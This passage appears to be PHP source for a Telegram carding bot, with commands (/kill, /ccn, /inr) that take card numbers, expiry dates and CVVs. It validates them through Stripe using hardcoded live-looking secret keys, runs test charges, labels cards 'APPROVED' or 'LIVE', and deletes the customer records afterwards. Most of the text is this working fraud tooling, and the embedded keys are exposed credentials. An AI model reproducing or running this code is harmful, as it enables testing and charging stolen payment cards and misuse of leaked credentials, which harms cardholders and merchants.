  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=500&currency=usd&customer='.$id.'');
  $result = curl_exec($ch);
  if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["seller_message"]== "Payment complete."){  
  $skresult = "✅APPROVED!✅";
  $skresponse = "CVV MATCHES! CHARGE 5$ SUCCESSFUL!✅";
  }else{
  $skresult = "❌DECLINED!❌";
  $skresponse = "❌CARD SUS";
  }}
  elseif(strpos($result, '"cvc_check": "pass"')){
  $skresult = "✅APPROVED!✅";
  $skresponse = "CVV MATCH! AUTH ONLY✅";
  }
  elseif(strpos($result, 'security code is incorrect')){
  $skresult = "✅APPROVED!";
  $skresponse = "CCN APPROVED!✅";
  }
  elseif (isset($c["error"])){
  $skresult = "❌DECLINED!❌";
  $skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
  }else{
  $skresult = "❌Error❌";
  $skresponse = "Please try again later!";
  };
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
  curl_exec($ch);
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
  curl_exec($ch);
  curl_close($ch);
  
  sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>'.$skresult.'</b>%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0A"👤 Checked By:</u> @'.$username.'<u>%0A🕑Time Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Stowe .</b>', $message_id);
  }
  

//////////=========[kill Command]=========//////////

elseif (strpos($message, "/kill") === 0){
  $lista = substr($message, 5);
  $i     = explode("|", $lista);
  $cc    = $i[0];
  $mon   = $i[1];
  $year  = $i[2];
  $year1 = substr($yyyy, 2, 4);
  $cvv   = $i[3];
  error_reporting(0);
  date_default_timezone_set('Asia/Jakarta');
  if ($_SERVER['REQUEST_METHOD'] == "POST"){
  extract($_POST);
  }
  elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
  extract($_GET);
  }
  function GetStr($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);  
  return $str[0];
  };
  $separa = explode("|", $lista);
  $cc = $separa[0];
  $mon = $separa[1];
  $year = $separa[2];
  $cvv = $separa[3];
  
  $skeys = array(
    1 => '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', // Enter at least one sk key
  //2 => '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',-----------------|
  //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
  //4 => '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',                 |
  //5 => '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',-----------------|
  ); 
  $skey = array_rand($skeys);
  $sk = $skeys[$skey];
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: lookup.binlist.net',
  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
  $fim = curl_exec($ch);
  $bank = GetStr($fim, '"bank":{"name":"', '"');
  $name = GetStr($fim, '"name":"', '"');
  $brand = GetStr($fim, '"brand":"', '"');
  $country = GetStr($fim, '"country":{"name":"', '"');
  $scheme = GetStr($fim, '"scheme":"', '"');
  $type = GetStr($fim, '"type":"', '"');
  if(strpos($fim, '"type":"credit"') !== false){
  $bin = 'Credit';
  }else{
  $bin = 'Debit';
  };
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded',));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
  $f = curl_exec($ch);
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $httpCode = $info['http_code'];
  $time = substr($time, 0, 4);
  $id = trim(strip_tags(GetStr($f,'"id": "','"')));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded',));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
  $result = curl_exec($ch);
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $httpCode = $info['http_code'];
  $time = substr($time, 0, 4);
  $c = json_decode(curl_exec($ch), true);
  curl_close($ch);
  $pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
  $cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
  if ($c["status"] == "pass"){ 
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
  $result = curl_exec($ch);
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
  $result = curl_exec($ch);
  $attachment_to_her = json_decode(curl_exec($ch), true);
  curl_close($ch);
  $attachment_to_her;
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=1000&currency=usd&customer='.$id.'');
  $result = curl_exec($ch);
  if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
  $skresult = "✅APPROVED!✅";
  $skresponse = "CVV MATCHES! KILL 20$ SUCCESSFUL!✅";
  $skresponse1 = "The CVC was sent and was correct | Risk score: Normal - 50 ";
}else{
  $skresult = "❌DECLINED!❌";
  $skresponse = "❌UNCHECKED CARD❌";
  $skresponse1 = "The CVC was sent but wasn’t checked by the issuing bank";
}}
elseif(strpos($result, '"cvc_check": "pass"')){
  $skresult = "✅APPROVED!✅";
  $skresponse = "CVV MATCH! AUTH ONLY✅";
  $skresponse1 = "The CVC was sent and was correct but CVC old or changed by card holder";
}
elseif(strpos($result, 'security code is incorrect')){
  $skresult = "✅APPROVED!";
  $skresponse = "CCN APPROVED!✅";
  $skresponse1 = "The CVC was sent but was incorrect - try /ccn to make charge";
}
elseif (isset($c["error"])){
  $skresult = "❌DECLINED!❌";
  $skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
  $skresponse1 = " your card was declined, please try another card or contract your issuing bank";
}else{
  $skresult = "❌Error❌";
  $skresponse = "❌Unavailable to check cvc❌";
  $skresponse1 = "The CVC wasn’t sent as it either wasn’t specified by the user, or the transaction is recurring and the CVC was previously deleted";
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);

sendMessage($chatId, '<u>💳 CARD:</u> <code>'.$lista.'</code>%0A<u>🔄 STATUS:</u> <b>'.$skresult.'</b>%0A<u>☑️ RESPONSE:</u> <b>'.$skresponse.'</b>%0A<u>ℹ️ EXTRA INFO:</u> <b>'.$skresponse1.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0A🔭 Checked By:</u> @'.$username.'<u>%0A⏳ Time Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: stowe .</b>', $message_id);
}

  //////////=========[ccn Command]=========//////////

elseif (strpos($message, "/ccn") === 0){
  $lista = substr($message, 5);
  $i     = explode("|", $lista);
  $cc    = $i[0];
  $mon   = $i[1];
  $year  = $i[2];
  $year1 = substr($yyyy, 2, 4);
  $cvv   = $i[3];
  error_reporting(0);
  date_default_timezone_set('Asia/Jakarta');
  if ($_SERVER['REQUEST_METHOD'] == "POST"){
  extract($_POST);
  }
  elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
  extract($_GET);
  }
  function GetStr($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);  
  return $str[0];
  };
  $separa = explode("|", $lista);
  $cc = $separa[0];
  $mon = $separa[1];
  $year = $separa[2];
  $cvv = $separa[3];
  
  $skeys = array(
    1 => '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', // Enter at least one sk key
  //2 => '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',-----------------|
  //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
  //4 => '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',                 |
  //5 => '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',-----------------|
  ); 
  $skey = array_rand($skeys);
  $sk = $skeys[$skey];
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: lookup.binlist.net',
  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
  $fim = curl_exec($ch);
  $bank = GetStr($fim, '"bank":{"name":"', '"');
  $name = GetStr($fim, '"name":"', '"');
  $brand = GetStr($fim, '"brand":"', '"');
  $country = GetStr($fim, '"country":{"name":"', '"');
  $scheme = GetStr($fim, '"scheme":"', '"');
  $type = GetStr($fim, '"type":"', '"');
  if(strpos($fim, '"type":"credit"') !== false){
  $bin = 'Credit';
  }else{
  $bin = 'Debit';
  };
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded',));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
  $f = curl_exec($ch);
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $httpCode = $info['http_code'];
  $time = substr($time, 0, 4);
  $id = trim(strip_tags(GetStr($f,'"id": "','"')));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded',));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'');
  $result = curl_exec($ch);
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $httpCode = $info['http_code'];
  $time = substr($time, 0, 4);
  $c = json_decode(curl_exec($ch), true);
  curl_close($ch);
  $pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
  $cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
  if ($c["status"] == "succeeded"){ 
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
  $result = curl_exec($ch);
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
  $result = curl_exec($ch);
  $attachment_to_her = json_decode(curl_exec($ch), true);
  curl_close($ch);
  $attachment_to_her;
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=50&currency=usd&customer='.$id.'');
  $result = curl_exec($ch);
  if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] = "null"){  
  $skresult = "✅APPROVED!✅";
  $skresponse = "CCN LIVE! CHARGE 1$ SUCCESSFUL!✅";
  $skresponse1 = "Security code was not found or not provided however your card is live and was charged more information at: https://verifone.cloud/docs/2checkout/Documentation | Risk score: Unchecked - Not enabled ";
  }else{
  $skresult = "❌DECLINED!❌";
  $skresponse = "❌CARD SUS";
  }}
  elseif(strpos($result, '"cvc_check": "null"')){
  $skresult = "✅APPROVED!✅";
  $skresponse = "CCN LIVE! AUTH ONLY✅";
  }
  elseif(strpos($result, 'security code is incorrect')){
  $skresult = "✅APPROVED!";
  $skresponse = "CCN APPROVED!✅";
  }
  elseif (isset($c["error"])){
  $skresult = "❌DECLINED!❌";
  $skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
  }else{
  $skresult = "❌Error❌";
  $skresponse = "Please try again later!";
  };
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
  curl_exec($ch);
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
  curl_exec($ch);
  curl_close($ch);
  
  sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>'.$skresult.'</b>%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A<u>EXTRA INFO:</u> <b>'.$skresponse1.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0AChecked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: stowe .</b>', $message_id);
  }
  
  /////////=========[inr Command]=========//////////

elseif (strpos($message, "/inr") === 0){
  $lista = substr($message, 5);
  $i     = explode("|", $lista);
  $cc    = $i[0];
  $mon   = $i[1];
  $year  = $i[2];
  $year1 = substr($yyyy, 2, 4);
  $cvv   = $i[3];
  error_reporting(0);
  date_default_timezone_set('Asia/Jakarta');
  if ($_SERVER['REQUEST_METHOD'] == "POST"){
  extract($_POST);
  }
  elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
  extract($_GET);
  }
  function GetStr($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);  
  return $str[0];
  };
  $separa = explode("|", $lista);
  $cc = $separa[0];
  $mon = $separa[1];
  $year = $separa[2];
  $cvv = $separa[3];
  
  $skeys = array(
    1 => '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', // Enter at least one sk key
    2 => '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',
  //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
  //4 => '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',                 |
  //5 => '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',-----------------|
  ); 
  $skey = array_rand($skeys);
  $sk = $skeys[$skey];
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: lookup.binlist.net',
  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
  $fim = curl_exec($ch);
  $bank = GetStr($fim, '"bank":{"name":"', '"');
  $name = GetStr($fim, '"name":"', '"');
  $brand = GetStr($fim, '"brand":"', '"');
  $country = GetStr($fim, '"country":{"name":"', '"');
  $scheme = GetStr($fim, '"scheme":"', '"');
  $type = GetStr($fim, '"type":"', '"');
  if(strpos($fim, '"type":"credit"') !== false){
  $bin = 'Credit';
  }else{
  $bin = 'Debit';
  };
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded',));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
  $f = curl_exec($ch);
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $httpCode = $info['http_code'];
  $time = substr($time, 0, 4);
  $id = trim(strip_tags(GetStr($f,'"id": "','"')));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded',));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
  $result = curl_exec($ch);
  $info = curl_getinfo($ch);
  $time = $info['total_time'];
  $httpCode = $info['http_code'];
  $time = substr($time, 0, 4);
  $c = json_decode(curl_exec($ch), true);
  curl_close($ch);
  $pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
  $cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
  if ($c["status"] == "succeeded"){ 
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
  curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
  $result = curl_exec($ch);
  curl_close($ch);
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
  $result = curl_exec($ch);
  $attachment_to_her = json_decode(curl_exec($ch), true);
  curl_close($ch);
  $attachment_to_her;
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
  curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-Type: application/x-www-form-urlencoded'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
